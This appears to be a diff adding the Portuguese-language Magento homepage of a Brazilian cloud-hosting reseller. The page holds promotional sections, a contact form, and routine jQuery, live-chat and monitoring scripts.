+                <span class="button f-right"><a onclick="setLocation('http://box.brandslog.tech/checkout/cart/')">
+                Editar carrinho            </a></span>
+    </div>
+</div>
+<script type="text/javascript">
+var $j = jQuery.noConflict();
+if ($j("body").hasClass("scrolling-fixed-header-enable")) {
+    $j(window).scroll(function() {    
+        var scroll = $j(window).scrollTop();
+        var src = $j(".scrolling-fixed-header-enable .header a.logo img").attr('src');
+        if (scroll >= 1) {
+            $j("body.scrolling-fixed-header-enable").addClass("scrolling-enable").removeClass("no-shadow");
+            $j(".scrolling-fixed-header-enable .header a.logo img").attr('src', src.replace('logo.png','logo-dark.png'));
+        }else{
+            $j("body.scrolling-fixed-header-enable").removeClass("scrolling-enable").addClass("no-shadow");
+            $j(".scrolling-fixed-header-enable .header a.logo img").attr('src', src.replace('logo-dark.png','logo.png'));
+        };
+    });
+};
+</script>    <div class="base page responsive">
+
+                <div id="slider_welcome_responsive" class="custom">
+            <div id="welcome">
+                <h1>OL&Aacute; BEM VINDO A,</h1>
+<h1>DIGITAL OCEAN</h1>
+<p>Servidores na nuvem pr&eacute;-configurados! Todas as aplica&ccedil;&otilde;es e os servidores s&atilde;o atualizados automaticamente. Sem preocupa&ccedil;&atilde;o! Sem transpira&ccedil;&atilde;o!</p>
+<p><small>Utilize o menu acima para navegar pelo site!</small></p>            </div>
+            
+
+        <script type="text/javascript">
+ var $j = jQuery.noConflict();
+// Truncate
+$j(function() {
+      $j(".truncate_slider_title").truncate({max_length: 60 });
+      $j(".truncate_slider_desc").truncate({max_length: 250 });
+ });
+</script>
+                
+                
+    <div id="homepage-contentslider-container" class="custom">
+
+        <!-- "previous slide" button -->
+            <a class="backward">prev</a>
+        <!-- container for the slides -->
+        <div class="images">
+
+            
+                                    <!-- first slide -->
+                                            <div class="slide one" style="background: url(http://box.brandslog.tech/media/rokmage-contentslider-images/) no-repeat 0 0;">
+                                                <div class="slider-productinfo">
+                            <h3><a href="http://box.brandslog.tech/#">DIGITAL OCEAN</a></h3>                        <p>Cloud Engineering</p>                                    </div>
+            <a class="slide-full-link" href="http://box.brandslog.tech/#"></a>                    </div>
+                                        <!-- second slide -->
+                                            <div class="slide two" style="background: url(http://box.brandslog.tech/media/rokmage-contentslider-images/) no-repeat 0 0;">
+                                                <div class="slider-productinfo">
+                            <h3><a href="http://box.brandslog.tech/#">DIGITAL OCEAN</a></h3>                        <p>Cloud Engineering</p>                                    </div>
+            <a class="slide-full-link" href="http://box.brandslog.tech/#"></a>                    </div>
+                                        <!-- third slide -->
+                                            <div class="slide three" style="background: url(http://box.brandslog.tech/media/rokmage-contentslider-images/) no-repeat 0 0;">
+                                                <div class="slider-productinfo">
+                            <h3><a href="http://box.brandslog.tech/#">DIGITAL OCEAN</a></h3>            <p>Cloud Engineering</p>                                        </div>
+                    <a class="slide-full-link" href="http://box.brandslog.tech/#"></a>                    </div>
+                                <!-- fourth slide -->
+                                    <div class="slide four" style="background: url(http://box.brandslog.tech/media/rokmage-contentslider-images/) no-repeat 0 0;">
+                                            <div class="slider-productinfo">
+                            <h3><a href="http://box.brandslog.tech/#">DIGITAL OCEAN</a></h3>                    <p>Cloud Engineering</p>                                            </div>
+                    <a class="slide-full-link" href="http://box.brandslog.tech/#"></a>                    </div>
+                            
+        </div>
+
+        <!-- "next slide" button -->
+        <a class="forward">next</a>
+        <!-- the tabs -->
+        <div class="tabs">
+                                    <a href="#"></a>
+                                    <a href="#"></a>
+                                    <a href="#"></a>
+                                    <a href="#"></a>
+                    </div>
+
+        <div class="clearfloat"></div>
+        </div>
+
+    <script type="text/javascript">
+        var $j = jQuery.noConflict();
+        $j(function() {
+            $j("div.tabs").tabs(".images > div", {
+                effect: 'fade',
+                fadeOutSpeed: "slow",
+                rotate: true
+                // use the slideshow plugin.
+            }).slideshow( { autoplay: true, interval: 4000, clickable: false, autopause: true});
+        });
+    </script>
+
+        </div>
+        
+        <div class="clearfloat"></div>
+        
+        <div class="main-container col2-right-layout">
+
+            
+            <div class="scroller-wrapper">
+                <div class="rt-overlay scroller">
+                                </div>
+            </div>
+                
+            <div class="main">
+
+                <div class="col-wrapper">
+                    <div class="col-main">
+                                                            <div class="std"><!-- Nossos Diferenciais -->
+<p><a name="diferenciais"></a></p>
+<div class="promo-diferenciais promo-wrapper">
+
+    <div class="promo-content">
+<div class="clearfloat">&nbsp;</div>
+        <h1><strong class="title">Nossos diferenciais</strong></h1>
+        <div class="rt-width-24 left">
+            <img src="http://box.brandslog.tech/media/wysiwyg/digital-ocean/hospedagem.png" alt="Ambiente de Hospedagem Gerenciado" />
+            <p><strong class="title">Ambiente de Hospedagem Gerenciado</strong></p>
+            <span>Servidores na nuvem pré-configurados! Todas as aplicações e os servidores são atualizados automaticamente. Sem preocupação! Sem transpiração!</span>
+        </div>
+        <div class="rt-width-24 left">
+            <img src="http://box.brandslog.tech/media/wysiwyg/digital-ocean/plataforma.png" alt="Plataforma Super Rápida" />
+            <p><strong class="title">Plataforma Super Rápida</strong></p>
+            <span>Plataforma Super Rápida desenvolvida com VMAN Fórmula Tecnologia, através da integração dos servidores de conteúdo Apache e Nginx, juntamente com o acelerador de página Varnish Page Cache e Memcached. <br><br> Com esta tecnologia o seu website terá um carregamento 50% mais rápido. Garantido!</span>
+        </div>
+        <div class="rt-width-24 left">
+            <img src="http://box.brandslog.tech/media/wysiwyg/digital-ocean/seguro.png" alt="Super Seguro" />
+            <p><strong class="title">Super Seguro</strong></p>
+            <span>Todos os nossos servidores na nuvem são protegidos por uma exclusiva camada protetora de Firewalls.<br><br>
+Além disso, acrescentamos um mecanismo de reforço de segurança - Security Hardening Mechanism -  que protege o servidor e seus dados completamente.</span>
+        </div>
+<div class="clearfloat">&nbsp;</div>
+        <div class="aplicacoes">
+        <div class="line-border-top">&nbsp;</div>
+        
+            <div class="texto rt-width-30 left" style="font-size: 1.2em;">
+                <p>Todas as aplicações estão hospedadas em Super Clouds.<br />Garantindo maior tranquilidade para o seu dia a dia.</p>
+            </div>
+            <div class="texto rt-width-10 left">
+                <img src="http://box.brandslog.tech/media/wysiwyg/digital-ocean/amazon-partner.png" alt="Amazon Partner Network" />
+            </div>
+            <div class="texto rt-width-10 left">
+                <img src="http://box.brandslog.tech/media/wysiwyg/digital-ocean/digitalocean.png" alt="Digital Ocean Power Cloud" />
+            </div>
+            <div class="texto rt-width-10 left">
+                <img src="http://box.brandslog.tech/media/wysiwyg/digital-ocean/google.png" alt="Google Cloud Plataform" />
+            </div>
+            <div class="texto rt-width-10 right">
+                <img src="http://box.brandslog.tech/media/wysiwyg/digital-ocean/vultr.png"  alt="Vultr High Performance Cloud" />
+            </div>
+        </div>
+<div class="clearfloat">&nbsp;</div>
+    </div>
+</div>
+
+
+<!-- VMan Tecnologia -->
+<p><a name="vman"></a></p>
+
+<div class="promo-vman promo-wrapper">
+    <div class="promo-content">
+        <br><br><br>
+         <div class="wman">
+          <h1><strong class="title">VMAN Tecnologia</strong></h1>
+                <img src="http://box.brandslog.tech/media/wysiwyg/digital-ocean/banner/banner1.png" alt="" title="" />
+               <div class="clearfloat">&nbsp;</div>
+                  <button type="button" onclick="Mudarestado('divVMAN')"><span>Mais Informações...</span></button>
+                   <div id="divVMAN" style="display: none;">
+                         <img src="http://box.brandslog.tech/media/wysiwyg/digital-ocean/banner/banner2.png" alt="" title="" />
+                   </div>
+                   <div class="clearfloat">&nbsp;</div>
+                </div>
+<div class="clearfloat">&nbsp;</div>
+</div>
+</div>
+
+
+
+<!-- A quem se destina ---->
+<p><a name="destina"></a></p>
+<div class="promo-destina promo-wrapper"><br /><br /><br /><br />
+<div class="promo-content"><br />
+<h1><strong class="title">A quem se destina</strong></h1>
+<br /><br />
+<div class="rt-width-33 left first"><span><img src="http://box.brandslog.tech/media/wysiwyg/digital-ocean/agencias.png" alt="" /></span> 
+<strong class="title">Agencias de Web Desing</strong><br />
+<p>Todas as aplica&ccedil;&otilde;es e os servidores<br /> s&atilde;o atualizadas autom&aacute;ticamente.</p>
+<br /> <button class="button" onclick="setLocation('http://rockettheme.com')"><span>Contrate</span></button></div>
+<div class="rt-width-33 left"><span> <img src="http://box.brandslog.tech/media/wysiwyg/digital-ocean/user.png" alt="" /></span> 
+<strong class="title">Uso Pessoal</strong><br />
+<p>Todas as aplica&ccedil;&otilde;es e os servidores<br /> s&atilde;o atualizadas autom&aacute;ticamente.</p>
+<br /> <button class="button" onclick="setLocation('http://rockettheme.com')"><span>Contrate</span></button></div>
+<div class="rt-width-33 left last"><span><img src="http://box.brandslog.tech/media/wysiwyg/digital-ocean/negocios.png" alt="" /></span> 
+<strong class="title">Uso Nos Neg&oacute;cios</strong><br />
+<p>Todas as aplica&ccedil;&otilde;es e os servidores<br /> s&atilde;o atualizadas autom&aacute;ticamente.</p>
+<br /> <button class="button" onclick="setLocation('http://rockettheme.com')"><span>Contrate</span></button></div>
+<div class="clearfloat">&nbsp;</div>
+</div>
+</div>
+<div class="clearfloat">&nbsp;</div>
+<div class="clearfloat">&nbsp;</div>
+<div class="clearfloat">&nbsp;</div>
+<div class="clearfloat">&nbsp;</div>
+<!--<div>
+<script type="text/javascript">var $j = jQuery.noConflict(); $j(document).ready(function(){$j("ul.display").addClass("thumb_view");$j("span.switch_thumb").addClass("swap");});</script>
+<div>
+<script type="text/javascript">
+    var $j = jQuery.noConflict();
+    $j(window).load(function(){
+
+        $j(".sorter .view-mode").css("display", "none");
+        $j("span.switch_thumb").css("display", "block");
+
+        $j("span.switch_thumb").click(function () {
+            $j("span.switch_thumb").toggleClass("swap");
+            $j("ul.display").animate({opacity: 0},"fast", function() {
+                $j(this).animate({opacity: 1},"fast").toggleClass("thumb_view").toggleClass("list");
+                // Undo equalized heights for list
+                $j('ul.list div.product-container').css("height","auto");
+                // Equalize all thumb heights on switch if list view default
+                var maxHeight = 0;
+                $j('ul.thumb_view div.product-container').each(function() { 
+					maxHeight = Math.max(maxHeight, $j(this).height()) + 1; 
+					}).height(maxHeight);
+            });
+            $j.cookie('view_State', $j('ul.display').is('.thumb_view') ? 'list' : 'thumbs' );
+        });
+
+        // COOKIES
+        // view state
+        var view_State = $j.cookie('view_State');
+        // Set the user's selection for the viewState
+        if (view_State == 'thumbs') {
+            $j("ul.display").addClass("thumb_view");
+            $j("span.switch_thumb").addClass("swap");
+        };
+        if (view_State == 'list') {
+            $j("ul.display").removeClass("thumb_view");
+            $j("span.switch_thumb").removeClass("swap");
+        };
+    });
+// Hide <p> if no content
+$j('.cms-index-index .col-main p').each(function() {
+    var $this = $j(this);
+    if($this.html().replace(/\s|&nbsp;/g, '').length == 0) {
+        $this.remove(); 
+    };
+}); 
+
+</script>
+
+
+
+<script type="text/javascript">
+    var $j = jQuery.noConflict();
+    // Truncate
+    $j(function() {
+        $j('.truncate_grid_title').truncate({max_length: 50});
+        $j('.truncate_grid_desc').truncate({max_length: 100});
+    });
+    $j(window).load(function(){
+        // Remove list class if thumbview
+        if ( $j("ul#products-list").hasClass("thumb_view") ) {
+            $j("ul#products-list").removeClass("list") };
+        // Equalize all thumb heights on switch if list view default
+        var maxHeight = 0;
+        $j('ul.thumb_view div.product-container').each(function() { maxHeight = Math.max(maxHeight, $j(this).height()) + 1; }).height(maxHeight);
+        // Undo equalized heights for list
+        $j('ul.list div.product-container').css("height","auto");
+    });
+</script>
+</div>
+
+
+<div class="bg-container">
+    <div class="category-title page-title">
+        <h1>Latest products</h1>
+    </div>
+    <div class="grid-text">
+        <p><span>Check out a selection of our items currently for sale:</span></p>    </div>
+
+                    <div class="category-products ">
+            <span id="switch_thumb" class="switch_thumb">Switch View</span>
+                        <ul class="display list" id="products-list">
+                </ul>
+</div>
+<div class="clearfloat"></div>
+</div>
+<div class="bg-container-end"></div>
+
+<script type="text/javascript">
+    var $j = jQuery.noConflict();
+    $j(document).ready(function(){
+        $j(".product-info-col").each(function(){
+            var link = $j("a:eq(0)", this).attr('href');
+            $j(".rating-links a:first", this).attr("href", link + "#reviews");
+            $j(".rating-links a:last", this).attr("href", link + "#review-form");
+        });
+    });
+</script>
+</div>-->
+<div class="promo-parceiro promo-wrapper">
+<div class="promo-content"><strong class="title">Gostaria de ser nosso parceiro,<br />e oferecer nossos servi&ccedil;os?</strong>
+<div class="clearfloat">&nbsp;</div>
+<button class="button" onclick="setLocation('/#contatos')"><span>Entre em Contato</span></button></div>
+</div>
+<div class="clearfloat">&nbsp;</div>
+<!-- Power Cloud -->
+<p><a name="powercloud"></a></p>
+<div class="promo-powercloud promo-wrapper">
+<div class="promo-content">
+<div class="clearfloat">&nbsp;</div>
+<div class="clearfloat">&nbsp;</div>
+<h1><strong class="title">Power Cloud</strong></h1>
+<h3>Procurando por uma solu&ccedil;&atilde;o customizada? N&oacute;s oferecemos o servi&ccedil;o Power Cloud</h3>
+<div class="clearfloat">&nbsp;</div>
+<div class="rt-width-100">
+<div class="rt-width-30 circle left">
+<div class="circle-white"><img src="http://box.brandslog.tech/media/wysiwyg/digital-ocean/amazon.png" alt="" /></div>
+</div>
+<div class="rt-width-60 left">
+<p>A sua aplica&ccedil;&atilde;o ficar&aacute; hospedada na Nuvem da AWS - Amazon Web Services, onde voc&ecirc; utilizar&aacute; a sua pr&oacute;pria conta pessoal AWS. O Servi&ccedil;o Power Cloud efetuar&aacute; todo o gerenciamento para que voc&ecirc; n&atilde;o tenha que se preocupar com os detalhes operacionais do dia a dia.</p>
+<div class="clearfloat">&nbsp;</div>
+<button class="button" onclick="setLocation('#')"> <span>Veja as caracteristicas</span> </button> <span>Toda a tecnologia VMAN em suas aplica&ccedil;&otilde;es+</span></div>
+<div class="clearfloat">&nbsp;</div>
+<button class="button-large" onclick="setLocation('')"> <span>Contrate agora mesmo</span> </button></div>
+</div>
+</div>
+<div class="clearfloat">&nbsp;</div>
+<div class="clearfloat">&nbsp;</div>
+
+
+<script type="text/javascript">
+function Mudarestado(el) {
+    var display = document.getElementById(el).style.display;
+    if(display == "none")
+        document.getElementById(el).style.display = 'block';
+    else
+        document.getElementById(el).style.display = 'none';
+};
+</script></div>                    </div>
+                </div>
+                <div class="col-right sidebar">
+                                    </div>
+            </div>
+        </div>
+        <div class="rt-bg-footer">
+                        
+
+<!--
+
+<script type="text/javascript">
+    var $j = jQuery.noConflict();
+      $j(document).ready(function() {
+        $j('.top-link').click(function(){
+          $j('html, body').animate({scrollTop:0}, 'fast');
+        });
+      });
+</script>
+
+-->
+
+<script type="text/javascript">
+	// Use jQuery com a variavel $j(...)
+	var $j = jQuery.noConflict();
+	$j(document).ready(function() {
+	$j(".top-link").hide();
+	$j(function () {
+	$j(window).scroll(function () {
+	if ($j(this).scrollTop() > 300) {
+	$j('.top-link').fadeIn();
+	} else {
+	$j('.top-link').fadeOut();
+	}
+	});
+	$j('.top-link').click(function() {
+	$j('body,html').animate({scrollTop:0}, 'fast');
+	}); 
+	    });});
+</script>
+
+<a name="contatos"></a>
+<div class="footer-wrapper footer-top">
+
+	<div class="footer">
+		<div class="clearfloat">&nbsp;</div>
+			<div class="promo-contato promo-wrapper">
+				<div class="promo-content">
+					<h1><strong class="title">Entre em Contato</strong></h1>
+					<div class="rt-width-40 left">
+						<div class="contato">
+							<div id="messages_product_view"></div>
+<div class="page-title">
+    <h1>Fale Conosco</h1>
+</div>
+<form action="http://box.brandslog.tech/contacts/index/post/"" id="contactForm" method="post">
+    <div class="fieldset">
+        <h2 class="legend">Informações de Contato</h2>
+        <ul class="form-list">
+            <li class="fields">
+                <div class="field">
+                    <label for="name" class="required"><em>*</em>Nome</label>
+                    <div class="input-box">
+                        <input name="name" id="name" title="Nome" value="" class="input-text required-entry" type="text" />
+                    </div>
+                </div>
+                <div class="field">
+                    <label for="email" class="required"><em>*</em>Email</label>
+                    <div class="input-box">
+                        <input name="email" id="email" title="Email" value="" class="input-text required-entry validate-email" type="text" />
+                    </div>
+                </div>
+            </li>
+            <li>
+                <label for="telephone">Telefone</label>
+                <div class="input-box">
+                    <input name="telephone" id="telephone" title="Telefone" value="" class="input-text" type="text" />
+                </div>
+            </li>
+            <li class="wide">
+                <label for="comment" class="required"><em>*</em>Comentários</label>
+                <div class="input-box">
+                    <textarea name="comment" id="comment" title="Comentários" class="required-entry input-text" cols="5" rows="3"></textarea>
+                </div>
+            </li>
+        </ul>
+    </div>
+    <div class="buttons-set">
+        <p class="required">* Campos Obrigatórios</p>
+        <input type="text" name="hideit" id="hideit" value="" style="display:none !important;" />
+        <button type="submit" title="Enviar" class="button"><span><span>Enviar</span></span></button>
+    </div>
+</form>
+<script type="text/javascript">
+//<![CDATA[
+    var contactForm = new VarienForm('contactForm', false);
+//]]>
+</script>
+
+						</div>
+					</div>
+					<div class="rt-width-40 left">
+						<h3><span class="title">Vamos Conversar?</span></h3>
+						<p>Quer discutir suas idéias sobre seu projeto, ou apenas dizer um oi?<br /> Nós adorariamos conversar com você. Basta preencher o formulário<br /> ao lado ou contacte-nos através dos dados abaixo:</p>
+						<br />
+						<div class="icones">
+							<h3><span class="title">Detalhes de Contato</span></h3>
+							<span class="icon i-address">&nbsp;</span>
+							<p>Av: Hygino Muzzi Filho, 1701 - Jd. Mirante<br /> Marília, SP - CEP: 17.525-000</p>
+							<br />
+							<span class="icon i-mail">&nbsp;</span>
+							<p><a href="mailto:atendimento@digitalocean.eng.br">atendimento@digitalocean.eng.br</a></p>
+							<br />
+							<span class="icon i-phone">&nbsp;</span>
+							<p>+55 14 3432-2476</p>
+						</div>
+					</div>
+				</div>
+			</div>
+		</div>
+		<div class="clearfloat">&nbsp;</div>
+		<div class="clearfloat">&nbsp;</div>
+		<div class="clearfloat">&nbsp;</div>
+		<div class="clearfloat">&nbsp;</div>
+		<div class="clearfloat">&nbsp;</div>
+	</div>
+</div>
+
+
+<div class="footer-wrapper">
+<div class="footer">
+<div id="rokmage-footer-text">
+  <div class="rt-social-buttons rt-block">
+
+    <a class="social-button rt-social-button-1" href="http://www.facebook.com/RocketTheme" target="_blank">
+      <span class="icon-facebook">&nbsp;</span>
+    </a>
+
+    <a class="social-button rt-social-button-2" href="https://twitter.com/rockettheme" target="_blank">
+      <span class="icon-twitter">&nbsp;</span>
+    </a>
+      
+    <a class="social-button rt-social-button-3" href="https://plus.google.com/114430407008695950828/posts" target="_blank">
+      <span class="icon-google-plus">&nbsp;</span>
+    </a>
+  
+    <a class="social-button rt-social-button-4" href="http://www.rockettheme.com/blog?format=feed&amp;type=rss" target="_blank">
+      <span class="icon-rss">&nbsp;</span>
+    </a>
+      
+    <a class="social-button rt-social-button-5" href="http://www.linkedin.com/in/rockettheme" target="_blank">
+      <span class="icon-linkedin">&nbsp;</span>
+    </a>
+    
+      
+    <div class="clear"></div>
+  </div>
+  <h4>Acompanhe nossas novidades</h4>
+</div>
+</div>
+    <div class="footer">
+  <a href="javascript:void(0);" class="top-link">&uarr; Topo</a> 
+   <!--  -->
+    <br/>
+    <div id="copyright">&copy; 2014 Digital Ocean. Todos os direitos reservados.<br>
+QUALIS IMPORT EIRELI -ME - CNPJ: 12.546.346/0001-79 </div><span class="hidden">(versão. 1.9.0.1)</span>
+<!--    <div id="rocketlogo"><a id="rocket" title="RocketTheme Templates Club" href="http://www.rockettheme.com/"></a></div> -->
+    </div>
+</div>        
+
+
+<script type="text/javascript">
+var $j = jQuery.noConflict();
+ </script>
+        </div>
+    </div>
+</div>
+</div>
+<!--Start of Zopim Live Chat Script-->
+<script type="text/javascript">
+window.$zopim||(function(d,s){var z=$zopim=function(c){z._.push(c)},$=z.s=
+d.createElement(s),e=d.getElementsByTagName(s)[0];z.set=function(o){z.set.
+_.push(o)};z._=[];z.set._=[];$.async=!0;$.setAttribute('charset','utf-8');
+$.src='//v2.zopim.com/?2aFc8TbzuIOCEwxi3WLdFiuEbzP24aqf';z.t=+new Date;$.
+type='text/javascript';e.parentNode.insertBefore($,e)})(document,'script');
+</script>
+<!--End of Zopim Live Chat Script--></div>
+<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"beacon":"bam.nr-data.net","licenseKey":"8a4310596d","applicationID":"18421943","transactionName":"YARTNkJYDEQEVUcKC1lOcAFEUA1ZSlVeEEteD1UHSBYLWQFTSw==","queueTime":0,"applicationTime":207,"atts":"TENQQApCH0o=","errorBeacon":"bam.nr-data.net","agent":""}</script></body>
+</html>
